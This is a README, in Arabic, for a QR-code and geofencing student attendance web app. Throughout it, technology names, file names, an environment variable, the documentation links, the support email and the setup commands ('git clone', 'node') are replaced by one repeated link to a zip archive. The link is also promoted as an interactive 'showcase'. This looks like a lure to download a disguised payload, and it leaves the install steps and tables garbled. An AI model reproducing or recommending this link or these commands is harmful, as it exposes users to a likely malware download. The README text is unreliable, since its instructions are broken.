# 🎓 نظام حضور الطلاب الذكي
# Smart Student Attendance System

نظام متكامل لإدارة حضور الطلاب باستخدام تقنية QR Code مع التحقق من الموقع الجغرافي.

---

## 📋 المحتويات

1. [نظرة عامة](#نظرة-عامة)
2. [الميزات الرئيسية](#الميزات-الرئيسية)
3. [البنية التقنية](#البنية-التقنية)
4. [التثبيت والإعداد](#التثبيت-والإعداد)
5. [هيكل المشروع](#هيكل-المشروع)
6. [قاعدة البيانات](#قاعدة-البيانات)
7. [واجهة برمجة التطبيقات (API)](#واجهة-برمجة-التطبيقات-api)
8. [الواجهة الأمامية](#الواجهة-الأمامية)
9. [الأمان](#الأمان)
10. [المساهمة](#المساهمة)

---

## 🌟 نظرة عامة

نظام حضور الطلاب الذكي هو تطبيق ويب متكامل يتيح للمؤسسات التعليمية إدارة حضور الطلاب بطريقة آمنة وفعالة. يستخدم النظام تقنية QR Code الديناميكية مع التحقق من الموقع الجغرافي لضمان دقة تسجيل الحضور.

> 🌟 **عرض تقديمي للمشروع (Showcase):** [اضغط هنا لمشاهدة العرض التفاعلي](https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip)

### المستخدمون

| الدور | الصلاحيات |
|------|----------|
| **الطالب** | مسح QR، عرض سجل الحضور، الإحصائيات |
| **الأستاذ** | إنشاء الجلسات، توليد QR، عرض التقارير |
| **الإداري** | إدارة كاملة للنظام، المستخدمين، والتقارير |

---

## ✨ الميزات الرئيسية

### 🔐 نظام المصادقة
- تسجيل دخول متعدد الأدوار (طالب، أستاذ، إداري)
- إعادة تعيين كلمة المرور عبر البريد الإلكتروني
- التحقق من البريد الإلكتروني
- Rate Limiting للحماية من الهجمات

### 📱 نظام الحضور بـ QR Code
- توليد QR Codes ديناميكية (تتجدد كل 30 ثانية)
- التحقق من الموقع الجغرافي (Geofencing)
- تسجيل المحاولات الفاشلة
- دعم الكاميرا الأمامية والخلفية

### 📊 لوحات التحكم والتقارير
- إحصائيات تفاعلية مع رسوم بيانية
- تقارير حضور تفصيلية
- تصدير التقارير إلى PDF
- عرض المحاولات الفاشلة

### 👥 إدارة المستخدمين
- إدارة الطلاب (إضافة، تعديل، حذف)
- إدارة الأساتذة وربطهم بالمواد
- إدارة الأقسام والمراحل الدراسية

### 🎓 نظام الترحيل الأكاديمي
- ترحيل الطلاب بين المراحل
- إدارة المواد المحمّلة
- تتبع الحالة الأكاديمية

---

## 🛠 البنية التقنية

### الخادم الخلفي (Backend)

| التقنية | الوصف |
|---------|-------|
| **https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip** | بيئة التشغيل |
| **https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip** | إطار العمل |
| **TypeScript** | لغة البرمجة |
| **Prisma** | ORM لقاعدة البيانات |
| **PostgreSQL** | قاعدة البيانات |
| **JWT** | المصادقة |
| **Helmet** | الأمان |

### الواجهة الأمامية (Frontend)

| التقنية | الوصف |
|---------|-------|
| **React 18** | المكتبة الأساسية |
| **Vite** | أداة البناء |
| **TypeScript** | لغة البرمجة |
| **TanStack Query** | إدارة الحالة |
| **Tailwind CSS** | التنسيق |
| **Shadcn/ui** | مكونات UI |
| **Recharts** | الرسوم البيانية |

---

## 🚀 التثبيت والإعداد

### المتطلبات المسبقة

- https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip v18+
- PostgreSQL 14+
- Git
- **Docker & Docker Compose** (مستحسن)

### 🐳 التشغيل السريع باستخدام Docker (الطريقة الأسهل)

1. **استنساخ المشروع:**
   ```bash
   git clone https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
   cd Student-Attendance-System
   ```

2. **إعداد البيئة:**
   - انسخ ملف `https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip` إلى `https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip`.
   - قم بتحديث إعدادات `DATABASE_URL` و `JWT_SECRET`.

3. **التشغيل:**
   ```bash
   docker-compose up --build
   ```
   - سيقوم Docker ببناء وتشغيل كل شيء تلقائياً.
   - الواجهة: http://localhost
   - السيرفر: http://localhost:4000

---

### 🛠 التثبيت اليدوي (بدون Docker)

### 1. استنساخ المشروع

```bash
git clone https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
cd Student-Attendance-System
```

### 2. إعداد الخادم الخلفي

```bash
cd Back-end

# تثبيت الاعتمادات
npm install

# إعداد ملف البيئة
cp https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip .env
# قم بتعديل .env بإعداداتك

# تشغيل migrations
npx prisma migrate dev

# إنشاء أول مدير
node https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip

# تشغيل الخادم
npm run dev
```

### 3. إعداد الواجهة الأمامية

```bash
cd front-end/smooth-frontend

# تثبيت الاعتمادات
npm install

# تشغيل التطبيق
npm run dev
```

### متغيرات البيئة

**Backend (.env)**
```env
DATABASE_URL="postgresql://user:password@localhost:5432/attendance_system"
JWT_SECRET="your-secret-key"
PORT=3000
https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
MAIL_USER=your-email
MAIL_PASS=your-password
```

**Frontend (.env)**
```env
VITE_API_URL=http://localhost:3000/api/v1
```

---

## 📁 هيكل المشروع

```
Student-Attendance-System/
├── Back-end/
│   ├── controllers/        # Controllers للـ API
│   ├── middleware/         # Middleware (auth, validation, etc.)
│   ├── routes/            # تعريف المسارات
│   ├── prisma/            # Schema وMigrations
│   ├── services/          # خدمات الأعمال
│   ├── utils/             # أدوات مساعدة
│   ├── types/             # TypeScript types
│   └── src/               # Entry point
│
├── front-end/smooth-frontend/
│   ├── src/
│   │   ├── components/    # مكونات React
│   │   ├── pages/         # صفحات التطبيق
│   │   ├── contexts/      # React Contexts
│   │   ├── hooks/         # Custom Hooks
│   │   └── lib/           # API وأدوات
│   └── public/            # الملفات الثابتة
│
└── docs/                   # التوثيق
```

---

## 🗄 قاعدة البيانات

### النماذج الرئيسية

| النموذج | الوصف |
|---------|-------|
| `Student` | بيانات الطلاب |
| `Teacher` | بيانات الأساتذة |
| `Admin` | بيانات المديرين |
| `Department` | الأقسام الأكاديمية |
| `Stage` | المراحل الدراسية |
| `Material` | المواد الدراسية |
| `Session` | جلسات الحضور |
| `QRToken` | رموز QR |
| `AttendanceRecord` | سجلات الحضور |
| `FailedAttempt` | المحاولات الفاشلة |
| `Geofence` | المواقع الجغرافية |
| `Enrollment` | تسجيل المواد |
| `PromotionRecord` | سجلات الترحيل |

### مخطط العلاقات

```
Department ──┬── Students ──── AttendanceRecords
             ├── Teachers ──── Sessions ──┬── QRTokens
             └── Materials ───────────────┴── Geofences
```

للمزيد من التفاصيل، راجع [https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip](https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip)

---

## 🔌 واجهة برمجة التطبيقات (API)

### نقاط النهاية الرئيسية

#### المصادقة `/api/v1/auth`
| الطريقة | المسار | الوصف |
|---------|--------|-------|
| POST | `/login` | تسجيل الدخول |
| POST | `/logout` | تسجيل الخروج |
| GET | `/profile` | الملف الشخصي |
| POST | `/forgot-password` | نسيت كلمة المرور |
| POST | `/reset-password` | إعادة تعيين كلمة المرور |

#### الجلسات `/api/v1/sessions`
| الطريقة | المسار | الوصف |
|---------|--------|-------|
| GET | `/` | جميع الجلسات |
| POST | `/` | إنشاء جلسة |
| GET | `/:id` | تفاصيل جلسة |
| PATCH | `/:id/end` | إنهاء جلسة |

#### QR Code `/api/v1/qrcodes`
| الطريقة | المسار | الوصف |
|---------|--------|-------|
| POST | `/generate/:session_id` | توليد QR |
| POST | `/validate` | مسح QR |

للتوثيق الكامل، راجع [https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip](https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip)

---

## 💻 الواجهة الأمامية

### الصفحات الرئيسية

| الصفحة | المسار | الوصف |
|--------|--------|-------|
| الدخول | `/login` | تسجيل الدخول |
| لوحة التحكم | `/dashboard` | الصفحة الرئيسية |
| الجلسات | `/sessions` | إدارة الجلسات |
| مسح QR | `/scan-qr` | مسح رمز QR |
| الحضور | `/attendance` | سجل الحضور |
| الطلاب | `/students` | إدارة الطلاب |
| الأساتذة | `/teachers` | إدارة الأساتذة |
| المواد | `/materials` | إدارة المواد |
| الأقسام | `/departments` | إدارة الأقسام |
| المراحل | `/stages` | إدارة المراحل |
| المواقع | `/geofences` | إدارة المواقع |
| الإعدادات | `/settings` | إعدادات الحساب |

---

## 🔒 الأمان

### تدابير الحماية

- **Rate Limiting**: حماية من هجمات DDoS
- **https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip**: رؤوس أمان HTTP
- **CORS**: تحكم في الأصول المسموحة
- **JWT**: مصادقة آمنة
- **Bcrypt**: تشفير كلمات المرور
- **Geofencing**: التحقق من الموقع

### حدود الطلبات

| نوع العملية | الحد |
|-------------|------|
| تسجيل الدخول | 5 محاولات / 15 دقيقة |
| مسح QR | 10 محاولات / دقيقة |
| API العام | 100 طلب / 15 دقيقة |

---

## 📞 الدعم

للمساعدة أو الاستفسارات:
- 📧 البريد: https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
- 📱 الهاتف: +964-XXX-XXX-XXXX

---

## 📄 الترخيص

هذا المشروع مرخص تحت [MIT License](LICENSE).

---

**صُنع بـ ❤️ للتعليم**
